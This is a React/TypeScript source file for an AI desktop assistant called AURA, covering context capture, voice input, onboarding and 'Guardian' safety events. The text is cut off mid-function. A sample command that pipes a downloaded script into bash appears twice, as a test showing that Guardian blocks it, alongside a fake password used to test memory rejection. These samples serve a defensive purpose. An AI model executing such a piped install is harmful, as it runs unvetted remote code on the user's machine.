import { useEffect, useMemo, useRef, useState } from 'react';
import { approveRun, captureAssistContext, compactMemory, getCostModels, getCostSummary, getCurrentContext, getDevices, getGuardianStatus, getLocalModelStatus, getMemoryItems, getProfileStatus, getRunState, getTools, getWorkflowSuggestions, getWorkflows, panicStop, pullLocalModel, rejectRun, resumeRun, retryRun, selectModel, sendCommand, subscribeRun, updateProfileStatus } from './state/api';
import ActionPanel from './ui/ActionPanel';
import { pushEvent, store } from './state/store';
import { BACKEND_URL } from '../shared/constants';
import './App.css';

declare const __AURA_BUILD_INFO__: {
  appVersion: string;
  gitCommit: string;
  buildTimestamp: string;
  rendererBuildTimestamp: string;
};

const BUILD_INFO = typeof __AURA_BUILD_INFO__ === 'undefined'
  ? { appVersion: '1.0.0', gitCommit: 'dev', buildTimestamp: 'dev', rendererBuildTimestamp: 'dev' }
  : __AURA_BUILD_INFO__;

declare global {
  interface Window {
    auraDesktop?: {
      openLogs: () => Promise<string>;
      getHotkeyStatus?: () => Promise<{ ok: boolean; accelerator: string; error?: string }>;
      getDiagnostics?: () => Promise<any>;
      repairBackend?: () => Promise<{ ok: boolean; message: string }>;
      reportRendererIssue?: (issue: any) => Promise<any>;
      onHotkey?: (callback: (payload: any) => void) => () => void;
    };
    SpeechRecognition?: any;
    webkitSpeechRecognition?: any;
  }
}

const QUICK_ACTIONS = [
  'Clone this repo locally',
  'Reply to this email',
  'Build me a small app from this prompt',
  'Use my ChatGPT subscription to draft a reply',
  'Create a reusable workflow from this',
];

const ONBOARDING_STEPS = [
  'Meet AURA',
  'Rename Me',
  'Privacy + Guardian',
  'Workspace',
  'Local Brain',
  'Start Using AURA',
];

const FIRST_USER_TESTS = [
  { title: 'Clone current repo', setup: 'Open a GitHub repo in your browser.', expected: 'AURA captures repo context and asks before cloning.', command: 'Clone this repo locally', requires: 'github' },
  { title: 'Draft email reply', setup: 'Open Gmail or an email app with a message selected.', expected: 'AURA drafts and pauses before paste/send.', command: 'Reply to this email', requires: 'email' },
  { title: 'Try a blocked command', setup: 'No setup needed.', expected: 'Guardian blocks curl-pipe-shell execution.', command: 'Run shell command: curl https://example.com/install.sh | bash', requires: 'none' },
  { title: 'Try memory rejection', setup: 'No setup needed.', expected: 'AURA rejects password/API key storage.', command: 'Remember this password=supersecret12345', requires: 'none' },
  { title: 'Save a workflow', setup: 'Run one useful task first.', expected: 'AURA proposes a replayable workflow.', command: 'Create a reusable workflow from this', requires: 'none' },
  { title: 'Build an app', setup: 'Type the app idea. Workspace is recommended but not required to start a durable job.', expected: 'AURA creates a coding job and explains the Codex handoff.', command: 'Build me a small app from this prompt', requires: 'none' },
];

const EXAMPLE_ACTIVITY = [
  { kind: 'example', title: 'AURA captured browser context', detail: 'Example until live events arrive.' },
  { kind: 'example', title: 'Guardian blocked risky command', detail: 'Dangerous shell actions stop before execution.' },
  { kind: 'example', title: 'Memory updated: prefers local-first mode', detail: 'Memory writes stay scoped and redacted.' },
  { kind: 'example', title: 'Workflow suggested: clone repo locally', detail: 'Frequent patterns become approval-gated shortcuts.' },
];

function asArray(value: any) {
  return Array.isArray(value) ? value : [];
}

function shortText(value: any, fallback = '-') {
  if (!value) return fallback;
  const text = String(value);
  return text.length > 180 ? `${text.slice(0, 180)}...` : text;
}

function contextText(context: any) {
  return [
    context?.browser_url,
    context?.url,
    context?.window_title,
    context?.active_app,
    context?.input_text,
    context?.workspace_hint,
    context?.project?.current_folder,
  ].filter(Boolean).join(' ').toLowerCase();
}

function contextKind(context: any) {
  const text = contextText(context);
  if (text.includes('github.com') || text.includes('github')) return 'github';
  if (text.includes('gmail') || text.includes('mail.google.com') || text.includes('mail') || text.includes('email')) return 'email';
  if (text.includes('code') || text.includes('xcode') || text.includes('terminal') || text.includes('error') || text.includes('package.json') || text.includes('.py')) return 'code';
  return 'none';
}

function missingContextMessage(kind: string, assistantName: string) {
  if (kind === 'github') return `I don't see a GitHub repo yet. Open one in your browser, then press Refresh Context or use the hotkey.`;
  if (kind === 'email') return `I don't see an email thread yet. Open Gmail or your email app, select a message, then press Refresh Context or use the hotkey.`;
  if (kind === 'workspace') return `Choose a workspace folder first so ${assistantName} can keep files contained.`;
  return '';
}

function buildContextActions(context: any) {
  const kind = contextKind(context);
  if (kind === 'github') {
    return [
      { title: 'Clone this repo', detail: 'Prepare a safe git clone and pause for approval before shell/file work.', command: 'Clone this repo locally', readiness: 'GitHub context found', requires: 'github' },
      { title: 'Summarize README', detail: 'Read the visible repository context and explain what it is.', command: 'Summarize this GitHub repo README', readiness: 'GitHub context found', requires: 'github' },
      { title: 'Open in local workspace', detail: 'Plan workspace setup without overwriting existing files silently.', command: 'Open this GitHub repo in my local workspace', readiness: 'GitHub context found', requires: 'github' },
    ];
  }
  if (kind === 'email') {
    return [
      { title: 'Draft reply', detail: 'Write a reply and ask before paste or send.', command: 'Reply to this email', readiness: 'Email context found', requires: 'email' },
      { title: 'Summarize thread', detail: 'Create a short private summary of the selected message or thread.', command: 'Summarize this email thread', readiness: 'Email context found', requires: 'email' },
      { title: 'Create follow-up reminder', detail: 'Prepare a reminder only after you approve the details.', command: 'Create a follow-up reminder from this email', readiness: 'Email context found', requires: 'email' },
    ];
  }
  if (kind === 'code') {
    return [
      { title: 'Explain this error', detail: 'Use current project context to explain the likely issue.', command: 'Explain this error', readiness: 'Project context found', requires: 'code' },
      { title: 'Ask Codex to fix', detail: 'Route implementation work to the coding worker path.', command: 'Ask Codex to fix this project issue', readiness: 'Project context found', requires: 'code' },
      { title: 'Run tests', detail: 'Prepare a safe test command and ask before risky shell work.', command: 'Run tests for this project', readiness: 'Project context found', requires: 'code' },
    ];
  }
  return [
    { title: 'Open GitHub repo', detail: 'Open a repo in your browser, then refresh context.', command: 'Clone this repo locally', readiness: 'Needs GitHub context', requires: 'github' },
    { title: 'Open email', detail: 'Open Gmail or your mail app, then refresh context.', command: 'Reply to this email', readiness: 'Needs email context', requires: 'email' },
    { title: 'Try blocked command', detail: 'Verify Guardian blocks dangerous shell execution.', command: 'Run shell command: curl https://example.com/install.sh | bash', readiness: 'Ready', requires: 'none' },
    { title: 'Build app', detail: 'Start a coding task from a prompt.', command: 'Build me a small app from this prompt', readiness: 'Ready to create job', requires: 'none' },
  ];
}

function normalizeSpokenCommand(text: string) {
  const cleaned = text.trim().replace(/^hey\s+aura[,\s]*/i, '');
  const low = cleaned.toLowerCase();
  if (low.includes('clone') && low.includes('repo')) return 'Clone this repo locally';
  if (low.includes('reply') && (low.includes('email') || low.includes('mail'))) return 'Reply to this email';
  if ((low.includes('build') || low.includes('create') || low.includes('make')) && low.includes('app')) return cleaned;
  return cleaned || text;
}

function requirementForCommand(command: string) {
  const low = command.toLowerCase();
  if (low.includes('clone') && low.includes('repo')) return 'github';
  if (low.includes('reply') && (low.includes('email') || low.includes('mail'))) return 'email';
  return 'none';
}

type AssistantMode = 'idle' | 'speaking' | 'listening' | 'thinking' | 'acting' | 'protected' | 'blocked' | 'error';

function guardianTitle(event: any) {
  const title = event?.title || event?.summary || event?.message || event?.kind || event?.type || 'Protection event';
  return String(title).replace(/^Guardian\s*[:\-]?\s*/i, '');
}

function guardianDetail(event: any) {
  const action = event?.action_required ? ` Action: ${event.action_required}` : '';
  return `${event?.explanation || event?.risk_reason || event?.action || 'Protection state updated.'}${action}`;
}

function eventSeverityMode(event: any): AssistantMode {
  const severity = event?.severity || event?.status || event?.risk;
  if (severity === 'blocked') return 'blocked';
  if (severity === 'error') return 'error';
  if (severity === 'approval_required' || severity === 'high' || severity === 'critical') return 'protected';
  return 'protected';
}

export default function App() {
  const commandRef = useRef<HTMLInputElement>(null);
  const recognitionRef = useRef<any>(null);
  const voiceCommandEnabledRef = useRef(false);
  const guardianEventKeysRef = useRef<Set<string>>(new Set());
  const [input, setInput] = useState('Summarize this');
  const [out, setOut] = useState('');
  const [runId, setRunId] = useState('');
  const [runStatus, setRunStatus] = useState('idle');
  const [startedAt, setStartedAt] = useState<number | null>(null);
  const [elapsed, setElapsed] = useState(0);
  const [coreStatus, setCoreStatus] = useState<'starting' | 'connected' | 'disconnected'>('starting');
  const [coreMessage, setCoreMessage] = useState('Starting AURA Core...');
  const [coreError, setCoreError] = useState('');
  const [hotkeyStatus, setHotkeyStatus] = useState({ ok: false, accelerator: 'CommandOrControl+Shift+Space', error: 'enable Accessibility permission for AURA/Electron in System Settings, then relaunch.' });
  const [compactCommand, setCompactCommand] = useState(false);
  const [voiceStatus, setVoiceStatus] = useState('Voice output ready. Wake word is not implemented yet.');
  const [voiceEnabled, setVoiceEnabled] = useState(() => localStorage.getItem('aura:voice-enabled') === '1');
  const [voiceCommandEnabled, setVoiceCommandEnabled] = useState(() => localStorage.getItem('aura:voice-command-enabled') === '1');
  const [isListening, setIsListening] = useState(false);
  const [voiceTranscript, setVoiceTranscript] = useState('');
  const [voiceUnsupportedReason, setVoiceUnsupportedReason] = useState('');
  const [assistantName, setAssistantName] = useState(() => localStorage.getItem('aura:assistant-name') || 'AURA');
  const [draftAssistantName, setDraftAssistantName] = useState(() => localStorage.getItem('aura:assistant-name') || 'AURA');
  const [caption, setCaption] = useState('Hello. I am AURA. Nice to meet you.');
  const [assistantMode, setAssistantMode] = useState<AssistantMode>('idle');
  const [contextStatus, setContextStatus] = useState('AURA is checking what it can see.');
  const [clarifications, setClarifications] = useState<any[]>([]);
  const [events, setEvents] = useState<any[]>([]);
  const [needsUser, setNeedsUser] = useState('');
  const [logsPath, setLogsPath] = useState('');
  const [currentUrl, setCurrentUrl] = useState('');
  const [sessionState, setSessionState] = useState('unknown');
  const [previewContext, setPreviewContext] = useState<any>(null);
  const [runState, setRunState] = useState<any>(null);
  const [draftText, setDraftText] = useState('');
  const [feedback, setFeedback] = useState('');
  const [advancedOpen, setAdvancedOpen] = useState(false);
  const [onboardingOpen, setOnboardingOpen] = useState(() => localStorage.getItem('aura:onboarding-complete') !== '1');
  const [onboardingStep, setOnboardingStep] = useState(() => Number(localStorage.getItem('aura:onboarding-step') || '0'));
  const [onboardingPrefs, setOnboardingPrefs] = useState({ memoryScope: 'personal', approvalMode: 'balanced', monthlyBudget: '0', workspace: '', selectedLocalModel: '', codexBridge: false, userAiHandoff: true, localModelSkipped: false });
  const [modelPullState, setModelPullState] = useState('');
  const [modelError, setModelError] = useState('');

  const [prefs, setPrefs] = useState<any[]>([]);
  const [memories, setMemories] = useState<any[]>([]);
  const [sessions, setSessions] = useState<any[]>([]);
  const [storage, setStorage] = useState<any>({});
  const [safety, setSafety] = useState<any[]>([]);
  const [tools, setTools] = useState<any[]>([]);
  const [devices, setDevices] = useState<any[]>([]);
  const [memoryItems, setMemoryItems] = useState<any[]>([]);
  const [workflows, setWorkflows] = useState<any[]>([]);
  const [workflowSuggestions, setWorkflowSuggestions] = useState<any[]>([]);
  const [profileStatus, setProfileStatus] = useState<any>(null);
  const [guardianStatus, setGuardianStatus] = useState<any>(null);
  const [localGuardianEvents, setLocalGuardianEvents] = useState<any[]>([]);
  const [costSummary, setCostSummary] = useState<any>(null);
  const [costModels, setCostModels] = useState<any[]>([]);
  const [localModelStatus, setLocalModelStatus] = useState<any>(null);
  const [diagnostics, setDiagnostics] = useState<any>(null);
  const [repairState, setRepairState] = useState('');

  function emitLocalGuardianEvent(event: { severity: string; title: string; explanation: string; action_required: string; type?: string; risk?: string; context?: any }) {
    const key = `${event.type || 'notice'}:${event.title}`;
    if (guardianEventKeysRef.current.has(key)) return null;
    guardianEventKeysRef.current.add(key);
    const item = {
      source: 'AURA Guardian',
      timestamp: Date.now() / 1000,
      type: event.type || 'notice',
      risk: event.risk || (event.severity === 'blocked' ? 'blocked' : event.severity === 'approval_required' ? 'high' : 'medium'),
      ...event,
    };
    setLocalGuardianEvents((prev) => [item, ...prev].slice(0, 12));
    setAssistantMode(eventSeverityMode(item));
    setCaption(item.explanation);
    return item;
  }

  async function refreshConnection() {
    setCoreStatus((current) => current === 'connected' ? current : 'starting');
    setCoreMessage('Starting AURA Core...');
    try {
      const r = await fetch(`${BACKEND_URL}/health`);
      if (!r.ok) throw new Error(`Health check returned HTTP ${r.status}`);
      setCoreStatus('connected');
      setCoreMessage('AURA Core online.');
      setCoreError('');
      return true;
    } catch (error: any) {
      setCoreStatus('disconnected');
      setCoreMessage('AURA Core disconnected.');
      setCoreError(error?.message || `Cannot reach ${BACKEND_URL}`);
      emitLocalGuardianEvent({
        severity: 'error',
        title: 'Guardian cannot reach AURA Core.',
        explanation: 'The backend is offline, so AURA can still show the shell but cannot execute computer actions yet.',
        action_required: 'Click Repair Backend or Retry before running a command.',
        type: 'backend_disconnect',
        risk: 'high',
      });
      return false;
    }
  }

  async function safeJson<T>(loader: () => Promise<T>, fallback: T) {
    try {
      return await loader();
    } catch {
      return fallback;
    }
  }

  async function refreshKnowledge() {
    const [p, m, ss, st, se, ts, ds, mi, wf, ws, profile, guardian, cost, models, localModel] = await Promise.all([
      safeJson(() => fetch(`${BACKEND_URL}/preferences`).then(r => r.json()), []),
      safeJson(() => fetch(`${BACKEND_URL}/memories`).then(r => r.json()), []),
      safeJson(() => fetch(`${BACKEND_URL}/browser/sessions`).then(r => r.json()), []),
      safeJson(() => fetch(`${BACKEND_URL}/storage/stats`).then(r => r.json()), {}),
      safeJson(() => fetch(`${BACKEND_URL}/safety/events`).then(r => r.json()), []),
      safeJson(() => getTools(), []),
      safeJson(() => getDevices(), []),
      safeJson(() => getMemoryItems(), []),
      safeJson(() => getWorkflows(), []),
      safeJson(() => getWorkflowSuggestions(), []),
      safeJson(() => getProfileStatus(), null),
      safeJson(() => getGuardianStatus(runId || undefined), null),
      safeJson(() => getCostSummary(), null),
      safeJson(() => getCostModels(), []),
      safeJson(() => getLocalModelStatus(), null),
    ]);
    setPrefs(asArray(p)); setMemories(asArray(m)); setSessions(asArray(ss)); setStorage(st || {}); setSafety(asArray(se));
    setTools(asArray(ts)); setDevices(asArray(ds)); setMemoryItems(asArray(mi)); setWorkflows(asArray(wf));
    setWorkflowSuggestions(asArray(ws)); setProfileStatus(profile); setGuardianStatus(guardian); setCostSummary(cost);
    setCostModels(asArray(models));
    if (localModel) {
      setLocalModelStatus(localModel);
      setModelError('');
      if (localModel?.selected_model?.id === 'simple' || localModel?.ollama?.running === false) {
        emitLocalGuardianEvent({
          severity: 'notice',
          title: 'Local model is using fallback mode.',
          explanation: 'Ollama or the selected local model is unavailable, so AURA will use the basic local fallback for simple/private tasks.',
          action_required: 'You can keep working, or set up Ollama later from Local Brain.',
          type: 'local_model_unavailable',
        });
      }
    } else {
      setModelError('Local model detection API did not respond. Start the backend and retry.');
    }
  }

  async function refreshDiagnostics() {
    try {
      const info = await window.auraDesktop?.getDiagnostics?.();
      if (info) setDiagnostics(info);
    } catch {
      setDiagnostics(null);
    }
  }

  async function repairBackend() {
    if (!window.auraDesktop?.repairBackend) {
      setRepairState('Backend repair is only available in the packaged or Electron desktop app.');
      return;
    }
    setRepairState('Repairing backend Python dependencies. This may take a few minutes...');
    const result = await window.auraDesktop.repairBackend();
    setRepairState(result.message || (result.ok ? 'Backend repaired.' : 'Backend repair failed. Open logs for details.'));
    await refreshDiagnostics();
    await refreshConnection();
    await refreshKnowledge();
  }

  async function refreshContext() {
    setContextStatus('Capturing current app, window, browser, and selection...');
    setAssistantMode('thinking');
    try {
      const context = await getCurrentContext();
      setPreviewContext(context);
      const kind = contextKind(context);
      const message = context?.active_app || context?.input_text ? `${assistantName} refreshed current context.` : 'Context refresh returned no visible app data. Check Accessibility and Screen Recording permissions.';
      setContextStatus(message);
      setCaption(kind === 'github' ? 'I found a GitHub repo. I can prepare a safe clone command when you are ready.' : kind === 'email' ? 'I found email context. I can draft, summarize, or create a follow-up, but I will ask before paste or send.' : message);
      setAssistantMode(kind === 'github' || kind === 'email' ? 'protected' : 'idle');
      if (!context?.active_app && !context?.browser_url && !context?.input_text) {
        emitLocalGuardianEvent({
          severity: 'notice',
          title: 'Guardian cannot inspect enough context yet.',
          explanation: 'AURA did not receive a visible app, browser URL, or selected text from the current Mac context.',
          action_required: 'Open the target app, grant Accessibility or Screen Recording if prompted, then refresh context.',
          type: 'missing_context',
        });
      }
    } catch (error: any) {
      try {
        const context = await captureAssistContext();
        setPreviewContext(context);
        setContextStatus(`${assistantName} captured fallback clipboard/assist context.`);
        setCaption('I captured fallback context. Some computer-control permissions may still be missing.');
        setAssistantMode('protected');
      } catch {
        setContextStatus(`Context unavailable: ${error?.message || 'permission or backend issue'}. Enable Accessibility/Screen Recording, then retry.`);
        setCaption('I cannot see the current app yet. Enable Accessibility or Screen Recording, then refresh context.');
        setAssistantMode('error');
        emitLocalGuardianEvent({
          severity: 'notice',
          title: 'Guardian cannot inspect the current app.',
          explanation: 'Context capture failed, usually because macOS permissions or backend connectivity are missing.',
          action_required: 'Enable Accessibility/Screen Recording if needed, then press Refresh context.',
          type: 'context_capture_failure',
        });
      }
    }
  }

  async function refreshRunState(targetRunId = runId) {
    if (!targetRunId) return;
    try {
      const state = await getRunState(targetRunId);
      setRunState(state);
      setDraftText(state?.approval_state?.edited_text || state?.approval_state?.draft_text || state?.draft_state?.draft_text || '');
    } catch {
      setRunStatus('disconnected');
    }
  }

  function speak(text: string, mode: AssistantMode = 'speaking') {
    setCaption(text);
    setAssistantMode(mode);
    if (!('speechSynthesis' in window) || typeof SpeechSynthesisUtterance === 'undefined') {
      setVoiceStatus('Speech synthesis is unavailable in this renderer.');
      return;
    }
    window.speechSynthesis.cancel();
    window.speechSynthesis.speak(new SpeechSynthesisUtterance(text));
    setVoiceStatus(`${assistantName} is speaking.`);
  }

  function speechRecognitionCtor() {
    return window.SpeechRecognition || window.webkitSpeechRecognition;
  }

  async function submitVoiceCommand(transcript: string) {
    const command = normalizeSpokenCommand(transcript);
    setVoiceTranscript(transcript);
    setInput(command);
    speak(`I heard: ${command}.`, 'thinking');
    await startAction({ title: command, command, requires: requirementForCommand(command) });
  }

  async function pushToTalk() {
    const Recognition = speechRecognitionCtor();
    if (!Recognition) {
      const reason = 'Voice recognition is unavailable in this Electron/WebView build. Type the command or try a Chromium build with Web Speech API support.';
      setVoiceUnsupportedReason(reason);
      setVoiceStatus(reason);
      setCaption('Wake word is coming soon. For now, press the mic or hotkey and speak when voice recognition is supported, or type the command.');
      setAssistantMode('error');
      return;
    }
    if (isListening) {
      recognitionRef.current?.stop?.();
      return;
    }
    try {
      const recognition = new Recognition();
      recognitionRef.current = recognition;
      recognition.lang = 'en-US';
      recognition.continuous = false;
      recognition.interimResults = true;
      setIsListening(true);
      setVoiceUnsupportedReason('');
      setVoiceStatus("I'm listening. Say a command like clone this repo.");
      setCaption("I'm listening.");
      setAssistantMode('listening');
      recognition.onresult = (event: any) => {
        const transcript = Array.from(event.results || [])
          .map((result: any) => result?.[0]?.transcript || '')
          .join(' ')
          .trim();
        setVoiceTranscript(transcript);
        if (transcript) setCaption(`I heard: ${transcript}`);
        const last = event.results?.[event.results.length - 1];
        if (last?.isFinal && transcript) {
          setIsListening(false);
          recognition.stop?.();
          submitVoiceCommand(transcript).catch((error) => {
            const message = `I heard you, but command submission failed: ${error?.message || 'unknown error'}.`;
            setVoiceStatus(message);
            setCaption(message);
            setAssistantMode('error');
          });
        }
      };
      recognition.onerror = (event: any) => {
        const message = event?.error === 'not-allowed'
          ? 'Microphone permission denied. Enable Microphone permission for AURA/Electron in System Settings, then try again.'
          : `Voice recognition failed: ${event?.error || 'unknown error'}. Type the command as fallback.`;
        setVoiceStatus(message);
        setCaption(message);
        setAssistantMode('error');
        setIsListening(false);
      };
      recognition.onend = () => setIsListening(false);
      recognition.start();
    } catch (error: any) {
      const message = `Voice recognition could not start: ${error?.message || 'permission or platform issue'}. Type the command as fallback.`;
      setVoiceStatus(message);
      setCaption(message);
      setAssistantMode('error');
      setIsListening(false);
    }
  }

  useEffect(() => {
    let alive = true;
    let delay = 500;
    async function tick() {
      const ok = await refreshConnection();
      if (!alive) return;
      delay = ok ? 2000 : Math.min(delay * 2, 7000);
      setTimeout(tick, delay);
    }
    tick();
    refreshKnowledge();
    refreshContext();
    refreshDiagnostics();
    window.auraDesktop?.getHotkeyStatus?.().then(setHotkeyStatus).catch(() => undefined);
    const unsubscribe = window.auraDesktop?.onHotkey?.(() => {
      setCompactCommand(true);
      setOnboardingOpen(false);
      refreshContext();
      speak("I'm listening. Tell me what you want done.", 'listening');
      if (voiceCommandEnabledRef.current) pushToTalk();
      setTimeout(() => commandRef.current?.focus(), 0);
    });
    return () => { alive = false; unsubscribe?.(); };
  }, []);

  useEffect(() => {
    localStorage.setItem('aura:onboarding-step', String(onboardingStep));
  }, [onboardingStep]);

  useEffect(() => {
    localStorage.setItem('aura:voice-enabled', voiceEnabled ? '1' : '0');
  }, [voiceEnabled]);

  useEffect(() => {
    voiceCommandEnabledRef.current = voiceCommandEnabled;
    localStorage.setItem('aura:voice-command-enabled', voiceCommandEnabled ? '1' : '0');
  }, [voiceCommandEnabled]);

  useEffect(() => {
    localStorage.setItem('aura:assistant-name', assistantName);
  }, [assistantName]);

  useEffect(() => {
    if (!onboardingOpen) return;
    const step = ONBOARDING_STEPS[onboardingStep] || ONBOARDING_STEPS[0];
    const copy = onboardingCopy(step);
    setCaption(copy.spoken || copy.body);
    setAssistantMode(step === 'Privacy + Guardian' ? 'protected' : step === 'Start Using AURA' ? 'listening' : 'speaking');
  }, [onboardingOpen, onboardingStep, assistantName]);

  useEffect(() => {
    if (!startedAt) return;
    const t = setInterval(() => setElapsed(Math.floor((Date.now() - startedAt) / 1000)), 200);
    return () => clearInterval(t);
  }, [startedAt]);

  async function captureContextForCommand(command: string) {
    setCaption("I'm checking your current context.");
    setAssistantMode('thinking');
    setContextStatus('Checking current app, browser, selection, and workspace...');
    let context: any = null;
    try {
      context = await getCurrentContext();
    } catch {
      try {
        context = await captureAssistContext();
      } catch {
        context = null;
      }
    }
    if (context) {
      setPreviewContext(context);
      const kind = contextKind(context);
      setContextStatus(kind === 'github'
        ? 'I found a GitHub repo in your browser.'
        : kind === 'email'
          ? 'I found email context.'
          : 'I refreshed what I can see.');
    } else {
      setContextStatus('I could not capture context. Check Accessibility, browser, or backend permissions.');
    }

    const requirement = requirementForCommand(command);
    const kind = contextKind(context);
    const missing = requirement === 'github' && kind !== 'github'
      ? missingContextMessage('github', assistantName)
      : requirement === 'email' && kind !== 'email'
        ? missingContextMessage('email', assistantName)
        : '';
    if (missing) {
      setNeedsUser(missing);
      setCaption(missing);
      setAssistantMode('protected');
      emitLocalGuardianEvent({
        severity: 'notice',
        title: requirement === 'github' ? 'Guardian needs GitHub context.' : 'Guardian needs email context.',
        explanation: missing,
        action_required: 'Open the required app/page, then press Refresh Context or use the hotkey.',
        type: 'missing_context',
        context: { requirement, context_kind: kind },
      });
      return null;
    }
    return context;
  }

  async function executeCommand(command: string, choices: Record<string, string> = {}, useMacro = false, context?: any) {
    setRunStatus('thinking');
    setAssistantMode('acting');
    setCaption(`I heard you. I'm planning this safely. Guardian will pause anything sensitive.`);
    setNeedsUser('');
    const res = await sendCommand(command, choices, useMacro, context);
    setOut(JSON.stringify(res, null, 2));
    setRunStatus(res.status || (res.ok ? 'running' : 'waiting'));
    const immediateGuardianEvents = asArray(res?.run_state?.guardian_events);
    if (immediateGuardianEvents.length) {
      setLocalGuardianEvents((prev) => [...immediateGuardianEvents, ...prev].slice(0, 12));
      const top = immediateGuardianEvents[immediateGuardianEvents.length - 1];
      setAssistantMode(eventSeverityMode(top));
      setCaption(top.explanation || top.summary || 'Guardian updated protection state.');
    }
    if (voiceEnabled) speak('I am working on it. Guardian will pause anything risky.');
    if (res.run_id) {
      setRunId(res.run_id);
      setStartedAt(Date.now());
      await refreshRunState(res.run_id);
      subscribeRun(res.run_id, async (evt) => {
        pushEvent(evt);
        setEvents([...(store.eventsByRun[res.run_id] || [])]);
        setRunStatus(evt.status || runStatus);
        if (evt.url) setCurrentUrl(evt.url);
        if (evt.session) setSessionState(evt.session);
        if (evt.type === 'needs_user') {
          setNeedsUser(evt.message || 'User action required.');
          setCaption(evt.message || 'I need your help before I continue.');
          setAssistantMode('protected');
        }
        if (evt.type === 'approval_required') {
          setNeedsUser('Draft ready for approval.');
          setCaption('Approval required before I continue.');
          setAssistantMode('protected');
        }
        if (evt.type === 'guardian_event') {
          setLocalGuardianEvents((prev) => [evt, ...prev].slice(0, 12));
          setAssistantMode(eventSeverityMode(evt));
          setCaption(evt.explanation || evt.message || 'Guardian updated protection state.');
          setGuardianStatus(await getGuardianStatus(res.run_id));
        }
        if (evt.status === 'running' && evt.type === 'step_status') setAssistantMode('acting');
        if (evt.status === 'success') {
          setCaption(evt.message || 'Done.');
          setAssistantMode('protected');
        }
        if (evt.type === 'resumed') setNeedsUser('');
        await refreshRunState(res.run_id);
      });
    }
    setClarifications(res.clarifications || []);
    if (res.status === 'needs_user') {
      setNeedsUser('Please complete the required manual action, then continue.');
      setCaption('I need a manual step before I can continue.');
      setAssistantMode('protected');
    }
    if (res.status === 'awaiting_approval') {
      setNeedsUser('Draft ready for approval.');
      setCaption('Approval required before I continue.');
      setAssistantMode('protected');
    }
    if (res.status === 'blocked' || res?.run_state?.status === 'blocked') {
      setCaption('Guardian blocked this action before it could run.');
      setAssistantMode('blocked');
    }
    if (res.ok && res.run_id && !res.status) {
      const job = res?.run_state?.last_observation?.agent_job_id || res?.steps?.[0]?.result?.result?.agent_job?.job_dir;
      setCaption(job ? `Done. I created a coding job at ${job}.` : 'Done.');
      setAssistantMode('protected');
      if (voiceEnabled) speak(job ? `Done. I created a coding job.` : 'Done.', 'protected');
    }
    refreshKnowledge();
  }

  async function run(choices: Record<string, string> = {}, useMacro = false) {
    const command = input.trim() || 'Summarize this';
    setInput(command);
    const context = await captureContextForCommand(command);
    if (context === null && requirementForCommand(command) !== 'none') return;
    await executeCommand(command, choices, useMacro, context);
  }

  const autoChoices = Object.fromEntries(clarifications.map((c: any) => [c.key, c.options[0]]));
  const finalText = useMemo(() => runState?.approval_state?.final_text || draftText || events.filter((e) => e.status === 'success').map((e) => e.message).filter(Boolean).join('\n') || out, [events, out, runState, draftText]);
  const approvalState = runState?.approval_state || {};
  const capturedContext = runState?.captured_context || runState?.planning_context || previewContext;
  const pendingApproval = approvalState.status === 'pending' || runStatus === 'awaiting_approval';
  const toolApproval = approvalState.kind === 'tool_confirmation';
  const generation = runState?.assist?.generation || {};
  const pasteState = runState?.pasteback_state || {};
  const pendingRisk = approvalState.risk_reason || approvalState.action_type || '';
  const launchFlow = runState?.plan?.signature || (capturedContext?.browser_url?.includes('github.com') ? 'github:clone' : 'desktop');
  const recommendedModel = localModelStatus?.recommendation?.recommended_pull || localModelStatus?.recommendation?.model || 'gemma4:e4b-nvfp4';
  const selectedLocalModel = onboardingPrefs.selectedLocalModel || recommendedModel;
  const selectedModelId = localModelStatus?.selected_model?.id || localModelStatus?.selected_model?.model;
  const localReady = Boolean((localModelStatus?.selected_model?.available && selectedModelId !== 'simple') || localModelStatus?.runtime_ready || localModelStatus?.assist_drafting_ready);
  const guardianEvents = [...localGuardianEvents, ...asArray(guardianStatus?.events)];
  const liveActivity = events.length
    ? events.slice(-8).reverse().map((event) => ({
      kind: event.type || event.status || 'run',
      title: event.type === 'context_captured'
        ? `${assistantName} checked current context.`
        : event.type === 'step_status'
          ? `${assistantName} ${event.status === 'running' ? 'is acting' : event.status === 'planned' ? 'planned a step' : event.status || 'updated a step'}: ${event.name || 'workflow step'}`
          : event.message || event.type || 'AURA updated run state',
      detail: event.guardian_reason || event.risk_reason || event.status || runId,
    }))
    : EXAMPLE_ACTIVITY;
  const memoryFeed = [
    ...memoryItems.slice(0, 3).map((item: any) => ({ title: `Remembered: ${item.memory_key || item.kind || 'memory'}`, detail: shortText(item.value || item.summary || item.scope, 'Scoped memory item') })),
    ...prefs.slice(0, 2).map((item: any) => ({ title: `Learning: ${item.decision_key}`, detail: shortText(item.value, 'Preference signal') })),
  ];
  const blockedCount = safety.filter((item: any) => item.ok === false || item.decision === 'blocked' || item.status === 'blocked').length + guardianEvents.filter((item: any) => item.status === 'blocked' || item.decision === 'blocked').length;
  const approvalsHandled = Number(profileStatus?.stats?.approvals_handled || 0) + (pendingApproval ? 1 : 0);
  const workflowsReplayed = workflows.reduce((sum: number, wf: any) => sum + (wf.success_count || 0), 0);
  const conservativeMinutesSaved = Math.max(0, Math.min(240, events.length * 2 + workflowsReplayed * 4 + memoryItems.length));
  const contextActions = buildContextActions(capturedContext);
  const buildLabel = `${BUILD_INFO.appVersion} / ${BUILD_INFO.gitCommit} / ${String(BUILD_INFO.rendererBuildTimestamp).replace('T', ' ').slice(0, 19)}`;
  const streamItems = [
    { kind: 'sees', title: `${assistantName} sees: ${capturedContext?.active_app || 'no active app yet'}`, detail: currentUrl || capturedContext?.browser_url || capturedContext?.window_title || contextStatus },
    { kind: 'thinking', title: `${assistantName} status: ${runStatus === 'thinking' ? 'thinking' : assistantMode === 'listening' ? 'listening' : 'ready'}`, detail: caption },
    ...(needsUser ? [{ kind: 'needs', title: `${assistantName} needs: user confirmation`, detail: needsUser }] : []),
    ...(pendingApproval ? [{ kind: 'guardian', title: 'Guardian: approval required', detail: pendingRisk || 'A sensitive action is paused until you approve it.' }] : []),
    ...guardianEvents.slice(0, 5).map((event: any) => ({ kind: `guardian ${event.severity || event.risk || ''}`, title: `Guardian: ${guardianTitle(event)}`, detail: guardianDetail(event) })),
    ...liveActivity.slice(0, 5).map((item) => ({ kind: item.kind, title: item.title, detail: item.detail })),
    ...(memoryFeed.length ? memoryFeed.slice(0, 2).map((item) => ({ kind: 'memory', title: item.title, detail: item.detail })) : [{ kind: 'empty', title: 'Try opening a GitHub repo and saying clone this repo.', detail: 'AURA will refresh context first, then ask before shell/file actions.' }]),
  ];

